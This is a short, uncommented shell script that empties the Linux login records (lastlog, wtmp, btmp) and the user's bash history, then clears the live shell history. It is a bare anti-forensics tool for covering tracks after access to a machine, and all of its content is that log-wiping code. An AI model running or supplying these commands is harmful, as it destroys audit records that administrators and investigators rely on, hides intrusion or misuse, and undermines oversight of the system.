#!/bin/sh

>/var/log/lastlog
>/var/log/wtmp
>/var/log/btmp
>~/.bash_history && history -c 
